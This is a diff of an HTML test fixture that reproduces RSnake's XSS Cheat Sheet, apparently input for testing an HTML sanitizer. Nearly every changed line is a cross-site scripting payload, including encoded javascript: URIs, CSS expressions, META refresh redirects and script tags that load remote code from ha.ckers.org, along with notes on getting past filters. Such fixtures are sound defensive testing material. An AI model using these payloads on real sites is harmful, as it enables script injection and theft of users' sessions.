@@ -1,6 +1,6 @@
-<div>The following was created by copying RSnake's
+<div>The following was created by copying RSnake's 
 <a href="http://ha.ckers.org/xss.html">XSS Cheat Sheet</a> as displayed by
-the browser, pasting it into a text file, wrapping it at 80 columns and
+the browser, pasting it into a text file, wrapping it at 80 columns and 
 putting the result inside a &lt;pre&gt; element.  This technique preserves
 the raw attack vectors and the descriptions.
 <pre>
@@ -49,14 +49,14 @@ vulnerable to XSS by messing up the output appreciably:
 vulnerable JavaScript on the page, this string is a nice compact XSS injection 
 check. View source after injecting it and look for <NeatHtmlReplace_XSS verses &lt;XSS to see 
 if it is vulnerable:
-      '';!&#45;&#45;"<NeatHtmlReplace_XSS>=&{()}
+      '';!&#45;&#45;"<NeatHtmlReplace_XSS>&#61;&{()}
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       No filter evasion. This is a normal XSS JavaScript injection, and most 
 likely to get caught but I suggest trying it first (the quotes are not required 
 in any modern browser so they are omitted here):
-      <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+      <SCRIPT SRC&#61;http://ha.ckers.org/xss.js></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -64,22 +64,22 @@ in any modern browser so they are omitted here):
 JavaScript directive in context of an image, but it does in other contexts, but 
 the following show the principles that would work in other tags as well - I'll 
 probably revise this at a later date):
-      <NeatHtmlReplace_IMG SRC="javascript:alert('XSS');">
+      <NeatHtmlReplace_IMG SRC&#61;"javascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       No quotes and no semicolon:
-      <NeatHtmlReplace_IMG SRC=javascript:alert('XSS')>
+      <NeatHtmlReplace_IMG SRC&#61;javascript:alert('XSS')>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Case insensitive XSS attack vector:
-      <NeatHtmlReplace_IMG SRC=JaVaScRiPt:alert('XSS')>
+      <NeatHtmlReplace_IMG SRC&#61;JaVaScRiPt:alert('XSS')>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       HTML entities (the semicolons are required for this to work):
-      <NeatHtmlReplace_IMG SRC=javascript:alert(&quot;XSS&quot;)>
+      <NeatHtmlReplace_IMG SRC&#61;javascript:alert(&quot;XSS&quot;)>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -87,7 +87,7 @@ probably revise this at a later date):
 quotes you can use a grave accent to encapsulate the JavaScript string - this 
 is also useful because lots of cross site scripting filters don't know about 
 grave accents):
-      <NeatHtmlReplace_IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+      <NeatHtmlReplace_IMG SRC&#61;`javascript:alert("RSnake says, 'XSS'")`>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -104,7 +104,7 @@ HTML tag:
       fromCharCode (if no quotes of any kind are allowed you can eval() a 
 fromCharCode in JavaScript to create any XSS vector you need). Click here to 
 build your own (thanks to Hannes Leopold):
-      <NeatHtmlReplace_IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+      <NeatHtmlReplace_IMG SRC&#61;javascript:alert(String.fromCharCode(88,83,83))>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -112,7 +112,7 @@ build your own (thanks to Hannes Leopold):
 directive inside of an <NeatHtmlReplace_IMG tag will not work in Firefox or Netscape 8.1+ in 
 the Gecko rendering engine mode). Use the XSS calculator for more information:
       <NeatHtmlReplace_IMG 
-SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#1
+SRC&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#1
 01;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
@@ -120,33 +120,33 @@ SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#1
       Long UTF-8 Unicode encoding without semicolons (this is often effective 
 in XSS that attempts to look for "&#XX;", since most people don't know about 
 padding - up to 7 numeric characters total). This is also useful against people 
-who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which 
+who decode against strings like $tmp_string &#61;~ s/.*\&#(\d+);.*/$1/; which 
 incorrectly assumes a semicolon is required to terminate a html encoded string 
 (I've seen this in the wild):
       <NeatHtmlReplace_IMG 
-SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#00
+SRC&#61;&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#00
 00112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0
 000039&#0000088&#0000083&#0000083&#0000039&#0000041>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Hex encoding without semicolons (this is also a viable XSS attack against 
-the above string $tmp_string =~ s/.*\&#(\d+);.*/$1/; which assumes that there 
+the above string $tmp_string &#61;~ s/.*\&#(\d+);.*/$1/; which assumes that there 
 is a numeric character following the pound symbol - which is not true with hex 
 HTML characters). Use the XSS calculator for more information:
       <NeatHtmlReplace_IMG 
-SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&
+SRC&#61;&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&
 #x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
-      Embedded tab to break up the cross site scripting attack: <NeatHtmlReplace_IMG SRC="jav 
+      Embedded tab to break up the cross site scripting attack: <NeatHtmlReplace_IMG SRC&#61;"jav 
 ascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Embedded encoded tab to break up XSS:
-      <NeatHtmlReplace_IMG SRC="jav&#x09;ascript:alert('XSS');">
+      <NeatHtmlReplace_IMG SRC&#61;"jav&#x09;ascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -154,7 +154,7 @@ ascript:alert('XSS');">
 chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 
 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii 
 chart for more details. The following four XSS examples illustrate this vector:
-      <NeatHtmlReplace_IMG SRC="jav&#x0A;ascript:alert('XSS');">
+      <NeatHtmlReplace_IMG SRC&#61;"jav&#x0A;ascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -162,14 +162,14 @@ chart for more details. The following four XSS examples illustrate this vector:
 making these strings longer than they have to be because the zeros could be 
 omitted. Often I've seen filters that assume the hex and dec encoding has to be 
 two or three characters. The real rule is 1-7 characters.):
-      <NeatHtmlReplace_IMG SRC="jav&#x0D;ascript:alert('XSS');">
+      <NeatHtmlReplace_IMG SRC&#61;"jav&#x0D;ascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Multiline Injected JavaScript using ASCII carriage returns (same as above 
 only a more extreme example of this XSS vector) these are not spaces just one 
 of the three characters as described above:
-      <NeatHtmlReplace_IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " >
+      <NeatHtmlReplace_IMG SRC &#61; " j a v a s c r i p t : a l e r t ( ' X S S ' ) " >
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -182,7 +182,7 @@ older versions of Opera (circa 7.11 on Windows) were vulnerable to one
 additional char 173 (the soft hypen control char). But the null char %00 is 
 much more useful and helped me bypass certain real world filters with a 
 variation on this example:
-      perl -e 'print "<NeatHtmlReplace_IMG SRC=java\0script:alert(\"XSS\")>";' > out
+      perl -e 'print "<NeatHtmlReplace_IMG SRC&#61;java\0script:alert(\"XSS\")>";' > out
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -199,7 +199,7 @@ useful if the pattern match doesn't take into account spaces in the word
 "javascript:" -which is correct since that won't render- and makes the false 
 assumption that you can't have a space between the quote and the "javascript:" 
 keyword. The actual reality is you can have any char from 1-32 in decimal):
-      <NeatHtmlReplace_IMG SRC=" &#14; javascript:alert('XSS');">
+      <NeatHtmlReplace_IMG SRC&#61;" &#14; javascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -207,8 +207,8 @@ keyword. The actual reality is you can have any char from 1-32 in decimal):
 found that it assumes a non-alpha-non-digit is not valid after an HTML keyword 
 and therefor considers it to be a whitespace or non-valid token after an HTML 
 tag. The problem is that some XSS filters assume that the tag they are looking 
-for is broken up by whitespace. For example "<NeatHtmlReplace_SCRIPT\s" != "<SCRIPT/XSS\s":
-      <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+for is broken up by whitespace. For example "<NeatHtmlReplace_SCRIPT\s" !&#61; "<SCRIPT/XSS\s":
+      <SCRIPT/XSS SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -219,7 +219,7 @@ numbers or encapsulation chars (like quotes, angle brackets, etc...) between
 the event handler and the equals sign, making it easier to bypass cross site 
 scripting blocks. Note that this also applies to the grave accent char as seen 
 here:
-      <NeatHtmlReplace_BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+      <NeatHtmlReplace_BODY onload!#$%&()*~+-_.,:;?@[/|\]^`&#61;alert("XSS")>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -227,7 +227,7 @@ here:
 that there is slightly different behavior between the IE and Gecko rendering 
 engines that allows just a slash between the tag and the parameter with no 
 spaces. This could be useful if the system does not allow spaces.
-      <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+      <SCRIPT/SRC&#61;"http://ha.ckers.org/xss.js"></SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -250,7 +250,7 @@ doesn't effect Firefox, this does not require any additional HTML below it. You
 can add quotes if you need to, but they're not needed generally, although 
 beware, I have no idea what the HTML will end up looking like once this is 
 injected:
-      <SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+      <SCRIPT SRC&#61;http://ha.ckers.org/xss.js?<B>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -261,7 +261,7 @@ rendering mode and Opera if you add in a </SCRIPT> tag at the end. However,
 this is especially useful where space is an issue, and of course, the shorter 
 your domain, the better. The ".j" is valid, regardless of the encoding type 
 because the browser knows it in context of a SCRIPT tag.
-      <SCRIPT SRC=//ha.ckers.org/.j>
+      <SCRIPT SRC&#61;//ha.ckers.org/.j>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -272,10 +272,10 @@ close angle bracket. This assumes there is any HTML tag below where you are
 injecting this cross site scripting vector. Even though there is no close ">" 
 tag the tags below it will close it. A note: this does mess up the HTML, 
 depending on what HTML is beneath it. It gets around the following NIDS regex: 
-/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|>)/ because it doesn't require the 
+/((\%3D)|(&#61;))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|>)/ because it doesn't require the 
 end ">". As a side note, this was also affective against a real world XSS 
 filter I came across using an open ended <NeatHtmlReplace_IFRAME tag instead of an <NeatHtmlReplace_IMG tag:
-      <NeatHtmlReplace_IMG SRC="javascript:alert('XSS')"
+      <NeatHtmlReplace_IMG SRC&#61;"javascript:alert('XSS')"
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -284,21 +284,21 @@ brought to my attention. At first I misclassified this as the same XSS vector
 as above but it's surprisingly different. Using an open angle bracket at the 
 end of the vector instead of a close angle bracket causes different behavior in 
 Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:
-      <NeatHtmlReplace_iframe src=http://ha.ckers.org/scriptlet.html &lt;
+      <NeatHtmlReplace_iframe src&#61;http://ha.ckers.org/scriptlet.html &lt;
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       XSS with no single quotes or double quotes or semicolons:
-      <SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
+      <SCRIPT>a&#61;/XSS/ alert(a.source)</SCRIPT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Escaping JavaScript escapes. When the application is written to output 
 some user information inside of a JavaScript like the following: <SCRIPT>var 
-a="$ENV{QUERY_STRING}";</SCRIPT> and you want to inject your own JavaScript 
+a&#61;"$ENV{QUERY_STRING}";</SCRIPT> and you want to inject your own JavaScript 
 into it but the server side application escapes certain quotes you can 
 circumvent that by escaping their escape character. When this is gets injected 
-it will read <SCRIPT>var a="\\";alert('XSS');//";</SCRIPT> which ends up 
+it will read <SCRIPT>var a&#61;"\\";alert('XSS');//";</SCRIPT> which ends up 
 un-escaping the double quote and causing the Cross Site Scripting vector to 
 fire. The XSS locator uses this method.:
       \";alert('XSS');//
@@ -312,20 +312,20 @@ which can encapsulate the malicious cross site scripting attack:
 
 
       INPUT image:
-      <NeatHtmlReplace_INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+      <NeatHtmlReplace_INPUT TYPE="IMAGE" SRC&#61;"javascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       BODY image:
-      <NeatHtmlReplace_BODY BACKGROUND="javascript:alert('XSS')">
+      <NeatHtmlReplace_BODY BACKGROUND&#61;"javascript:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       BODY tag (I like this method because it doesn't require using any 
 variants of "javascript:" or "<NeatHtmlReplace_SCRIPT..." to accomplish the XSS attack). Dan 
 Crowley additionally noted that you can put a space before the equals sign 
-("onload=" != "onload ="):
-      <NeatHtmlReplace_BODY ONLOAD=alert('XSS')>
+("onload&#61;" !&#61; "onload &#61;"):
+      <NeatHtmlReplace_BODY ONLOAD&#61;alert('XSS')>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -379,7 +379,7 @@ onDragEnd() (requires that the user drags an object) 31. onDragLeave()
 drops an object (e.g. file) onto the browser window) 36. onEnd() (the onEnd 
 event fires when the timeline ends. This can be exploited, like most of the 
 HTML+TIME event handlers by doing something like <P 
-STY&#76;E="behavior:url('#default#time2')" onEnd="alert('XSS')">) 37. onError() 
+STYLE&#61;"behavior:url('#default#time2')" onEnd&#61;"alert('XSS')">) 37. onError() 
 (loading of a document or image causes an error) 38. onErrorUpdate() (fires on 
 a databound object when an error occurs while updating the associated data in 
 the data source object) 39. onFilterChange() (fires when a visual filter 
@@ -455,17 +455,17 @@ using the AUTOREVERSE attribute.)
 
 
       IMG Dynsrc:
-      <NeatHtmlReplace_IMG DYNSRC="javascript:alert('XSS')">
+      <NeatHtmlReplace_IMG DYNSRC&#61;"javascript:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       IMG lowsrc:
-      <NeatHtmlReplace_IMG LOWSRC="javascript:alert('XSS')">
+      <NeatHtmlReplace_IMG LOWSRC&#61;"javascript:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       BGSOUND:
-      <NeatHtmlReplace_BGSOUND SRC="javascript:alert('XSS');">
+      <NeatHtmlReplace_BGSOUND SRC&#61;"javascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -475,7 +475,7 @@ using the AUTOREVERSE attribute.)
 
 
       LAYER (also only works in Netscape 4.x)
-      <NeatHtmlReplace_LAYER SRC="http://ha.ckers.org/scriptlet.html"></NeatHtmlReplace_LAYER>
+      <NeatHtmlReplace_LAYER SRC&#61;"http://ha.ckers.org/scriptlet.html"></NeatHtmlReplace_LAYER>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] [NS4]
 
 
@@ -513,7 +513,7 @@ and Opera). The trick here is that I am setting a header (which is basically no
 different than in the HTTP header saying Link: <NeatHtmlReplace_http://ha.ckers.org/xss.css>; 
 REL=stylesheet) and the remote style sheet with my cross site scripting vector 
 is running the JavaScript, which is not supported in FireFox:
-      <NeatHtmlReplace_META HTTP-EQUIV="Link" Content="<NeatHtmlReplace_http://ha.ckers.org/xss.css>; 
+      <NeatHtmlReplace_META HTTP-EQUIV&#61;"Link" Content&#61;"<NeatHtmlReplace_http://ha.ckers.org/xss.css>; 
 REL=stylesheet">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
@@ -531,7 +531,7 @@ vast majority of sites:
 scripting vectors because it uses an .htc file which must be on the same server 
 as the XSS vector. The example file works by pulling in the JavaScript and 
 running it as part of the style attribute:
-      <NeatHtmlReplace_XSS STY&#76;E="behavior: url(xss.htc);">
+      <NeatHtmlReplace_XSS STYLE&#61;"behavior: url(xss.htc);">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -544,17 +544,17 @@ url("javascript:alert('XSS')");}</NeatHtmlReplace_STYLE><UL><LI>XSS
 
 
       VBscript in an image:
-      <NeatHtmlReplace_IMG SRC='vbscript:msgbox("XSS")'>
+      <NeatHtmlReplace_IMG SRC&#61;'vbscript:msgbox("XSS")'>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Mocha (older versions of Netscape only):
-      <NeatHtmlReplace_IMG SRC="mocha:[code]">
+      <NeatHtmlReplace_IMG SRC&#61;"mocha:[code]">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] [NS4]
 
 
       Livescript (older versions of Netscape only):
-      <NeatHtmlReplace_IMG SRC="livescript:[code]">
+      <NeatHtmlReplace_IMG SRC&#61;"livescript:[code]">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] [NS4]
 
 
@@ -572,7 +572,7 @@ anyone interested in alternate encoding issues look at my charsets issues page:
       META (the odd thing about meta refresh is that it doesn't send a referrer 
 in the header - so it can be used for certain types of attacks where you need 
 to get rid of referring URLs):
-      <NeatHtmlReplace_META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+      <NeatHtmlReplace_META HTTP-EQUIV&#61;"refresh" CONTENT&#61;"0;url&#61;javascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -582,44 +582,44 @@ directive in it, because it utilizes base64 encoding. Please see RFC 2397 for
 more details or go here or here to encode your own. You can also use the XSS 
 calculator below if you just want to encode raw HTML or JavaScript as it has a 
 Base64 encoding method:
-      <NeatHtmlReplace_META HTTP-EQUIV="refresh" 
-CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+      <NeatHtmlReplace_META HTTP-EQUIV&#61;"refresh" 
+CONTENT&#61;"0;url&#61;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       META with additional URL parameter. If the target website attempts to see 
 if the URL contains "http://" at the beginning you can evade it with the 
 following technique (Submitted by Moritz Naumann):
-      <NeatHtmlReplace_META HTTP-EQUIV="refresh" CONTENT="0; 
-URL=http://;URL=javascript:alert('XSS');">
+      <NeatHtmlReplace_META HTTP-EQUIV&#61;"refresh" CONTENT&#61;"0; 
+URL&#61;http://;URL&#61;javascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       IFRAME (if iframes are allowed there are a lot of other XSS problems as 
 well):
-      <NeatHtmlReplace_IFRAME SRC="javascript:alert('XSS');"></NeatHtmlReplace_IFRAME>
+      <NeatHtmlReplace_IFRAME SRC&#61;"javascript:alert('XSS');"></NeatHtmlReplace_IFRAME>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       FRAME (frames have the same sorts of XSS problems as iframes):
-      <NeatHtmlReplace_FRAMESET><NeatHtmlReplace_FRAME SRC="javascript:alert('XSS');"></NeatHtmlReplace_FRAMESET>
+      <NeatHtmlReplace_FRAMESET><NeatHtmlReplace_FRAME SRC&#61;"javascript:alert('XSS');"></NeatHtmlReplace_FRAMESET>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       TABLE (who would have thought tables were XSS targets... except me, of 
 course):
-      <NeatHtmlParserReset s='' d=""></NeatHtmlParserReset><script></script><TABLE BACKGROUND="javascript:alert('XSS')">
+      <NeatHtmlParserReset s='' d=""></NeatHtmlParserReset><script></script><TABLE BACKGROUND&#61;"javascript:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       TD (just like above, TD's are vulnerable to BACKGROUNDs containing 
 JavaScript XSS vectors):
-      <NeatHtmlReplace_TABLE><NeatHtmlParserReset s='' d=""></NeatHtmlParserReset><script></script><TD BACKGROUND="javascript:alert('XSS')">
+      <NeatHtmlReplace_TABLE><NeatHtmlParserReset s='' d=""></NeatHtmlParserReset><script></script><TD BACKGROUND&#61;"javascript:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       DIV background-image:
-      <DIV STY&#76;E="background-image: url(javascript:alert('XSS'))">
+      <DIV STYLE&#61;"background-image: url(javascript:alert('XSS'))">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -627,7 +627,7 @@ JavaScript XSS vectors):
 slightly to obfuscate the url parameter). The original vulnerability was found 
 by Renaud Lifchitz as a vulnerability in Hotmail:
       <DIV 
-STY&#76;E="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072
+STYLE&#61;"background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072
 \0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029
 '\0029">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
@@ -638,13 +638,13 @@ detect any erroneous characters that are allowed after the open parenthesis but
 before the JavaScript directive in IE and Netscape 8.1 in secure site mode. 
 These are in decimal but you can include hex and add padding of course. (Any of 
 the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
-      <DIV STY&#76;E="background-image: url(&#1;javascript:alert('XSS'))">
+      <DIV STYLE&#61;"background-image: url(&#1;javascript:alert('XSS'))">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       DIV expression - a variant of this was effective against a real world 
 cross site scripting filter using a newline between the colon and "expression":
-      <DIV STY&#76;E="width: expression(alert('XSS'));">
+      <DIV STYLE&#61;"width: expression(alert('XSS'));">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -656,21 +656,21 @@ into an infinite loop of alerts):
 
       STYLE attribute using a comment to break up expression (Thanks to Roman 
 Ivanov for this one):
-      <NeatHtmlReplace_IMG STY&#76;E="xss:expr/*XSS*/ession(alert('XSS'))">
+      <NeatHtmlReplace_IMG STYLE&#61;"xss:expr/*XSS*/ession(alert('XSS'))">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Anonymous HTML with STYLE attribute (IE6.0 and Netscape 8.1+ in IE 
 rendering engine mode don't really care if the HTML tag you build exists or 
 not, as long as it starts with an open angle bracket and a letter):
-      <NeatHtmlReplace_XSS STY&#76;E="xss:expression(alert('XSS'))">
+      <NeatHtmlReplace_XSS STYLE&#61;"xss:expression(alert('XSS'))">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       IMG STYLE with expression (this is really a hybrid of the above XSS 
 vectors, but it really does show how hard STYLE tags can be to parse apart, 
 like above this can send IE into a loop):
-      exp/*<A STY&#76;E='no\xss:noxss("*//*"); 
+      exp/*<A STYLE&#61;'no\xss:noxss("*//*"); 
 xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
@@ -717,7 +717,7 @@ comment this will work):
 infect the users, etc. and same with the APPLET tag). The linked file is 
 actually an HTML file that can contain your XSS:
       <NeatHtmlReplace_OBJECT TYPE="text/x-scriptlet" 
-DATA="http://ha.ckers.org/scriptlet.html"></NeatHtmlReplace_OBJECT>
+DATA&#61;"http://ha.ckers.org/scriptlet.html"></NeatHtmlReplace_OBJECT>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -728,11 +728,11 @@ name=url value=javascript:alert('XSS')></NeatHtmlReplace_OBJECT>
 
 
       Using an EMBED tag you can embed a Flash movie that contains XSS. Click 
-here for a demo. If you add the attributes allowScriptAccess="never" and 
-allownetworking="internal" it can mitigate this risk (thank you to Jonathan 
+here for a demo. If you add the attributes allowScriptAccess&#61;"never" and 
+allownetworking&#61;"internal" it can mitigate this risk (thank you to Jonathan 
 Vanasco for the info).:
-      <NeatHtmlReplace_EMBED SRC="http://ha.ckers.org/xss.swf" 
-AllowScriptAccess="always"></NeatHtmlReplace_EMBED>
+      <NeatHtmlReplace_EMBED SRC&#61;"http://ha.ckers.org/xss.swf" 
+AllowScriptAccess&#61;"always"></NeatHtmlReplace_EMBED>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -740,25 +740,25 @@ AllowScriptAccess="always"></NeatHtmlReplace_EMBED>
 works in Firefox, but it's better than the above vector in Firefox because it 
 does not require the user to have Flash turned on or installed. Thanks to 
 nEUrOO for this one.
-      <NeatHtmlReplace_EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH 
+      <NeatHtmlReplace_EMBED SRC&#61;"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH 
 A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv 
 MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs 
 aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw 
 IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh 
-TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" 
-AllowScriptAccess="always"></NeatHtmlReplace_EMBED>
+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg&#61;&#61;" type="image/svg+xml" 
+AllowScriptAccess&#61;"always"></NeatHtmlReplace_EMBED>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Using ActionScript inside flash can obfuscate your XSS vector:
-      a="get"; b="URL(\""; c="javascript:"; d="alert('XSS');\")"; eval(a+b+c+d);
+      a&#61;"get"; b&#61;"URL(\""; c&#61;"javascript:"; d="alert('XSS');\")"; eval(a+b+c+d);
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       XML namespace. The htc file must be located on the same server as your 
 XSS vector:
-      <NeatHtmlReplace_HTML xmlns:xss> <?NeatHtmlReplace_import namespace="xss" 
-implementation="http://ha.ckers.org/xss.htc"> <NeatHtmlReplace_xss:xss>XSS</NeatHtmlReplace_xss:xss> </NeatHtmlReplace_HTML>
+      <NeatHtmlReplace_HTML xmlns:xss> <?NeatHtmlReplace_import namespace&#61;"xss" 
+implementation&#61;"http://ha.ckers.org/xss.htc"> <NeatHtmlReplace_xss:xss>XSS</NeatHtmlReplace_xss:xss> </NeatHtmlReplace_HTML>
